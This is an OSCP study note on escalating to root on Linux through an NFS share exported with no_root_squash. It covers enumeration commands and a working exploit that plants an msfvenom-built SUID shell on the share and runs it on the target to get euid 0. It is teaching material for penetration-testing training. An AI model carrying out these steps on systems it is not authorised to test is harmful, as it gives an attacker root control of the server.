---
title: "NFS no_root_squash"
slug: nfs-no-root-squash
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-19T23:38:46+03:00
modDatetime: 2026-07-19T23:38:46+03:00
description: "NFS shares are exported from `/etc/exports`."
---
NFS shares are exported from `/etc/exports`. When a share is exported with `no_root_squash`, a client that mounts it can create files owned by root on the server. Create a SUID root binary on the share from Kali, then execute it on the target for a root shell. The privilege is carried by the SUID bit, so the mechanism recap is in [SUID Binaries](/collections/oscp/suid-binaries) and [Linux Permissions](/collections/oscp/linux-permissions).

## Background: Root Squashing

When a client mounts an NFS share and writes a file, the server decides which user owns it on disk. The dangerous case is a client acting as root (uid 0): letting it create root-owned files would make anyone who is root on their own machine effectively root on the server's filesystem.

Root squashing is the default protection. A client acting as uid 0 is mapped to `nobody:nogroup` on the server, so a mounted root cannot write root-owned files. `no_root_squash` turns that protection off: files created as root on the client keep uid 0 on the server. That single option is the whole vulnerability.

The escalation is two facts combined:

1. `no_root_squash` lets a root-owned file be planted on the target from Kali.
2. A root-owned SUID binary runs as root for whoever executes it ([SUID Binaries](/collections/oscp/suid-binaries)).

Plant a root-owned SUID shell from Kali, run it on the target as the low-privilege user, and the effective uid becomes 0.

## Enumerate

```bash
showmount -e <target>                       # list exported shares
nmap -sV --script=nfs-showmount <target>    # same, via nmap
cat /etc/exports                            # on the target, if readable
```

In `/etc/exports`, look for a writable share carrying the option:

```text
/tmp   *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

## Exploit

Mount the share from Kali as root, drop a SUID-root shell payload, run it on the target as the low-privilege user:

```bash
# Kali (must be root locally so the created file is uid 0)
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf     # +s SUID, +x executable, created owned by root
```

```bash
# target (low-privilege user)
/tmp/shell.elf                   # SUID root -> euid 0
id                               # euid=0(root)
```

The file is root-owned (because of `no_root_squash`) and set-uid, so executing it on the target sets the effective UID to 0. `CMD="/bin/bash -p"` keeps the elevated effective UID in the spawned shell, the same `-p` reasoning as in [SUID Binaries](/collections/oscp/suid-binaries).
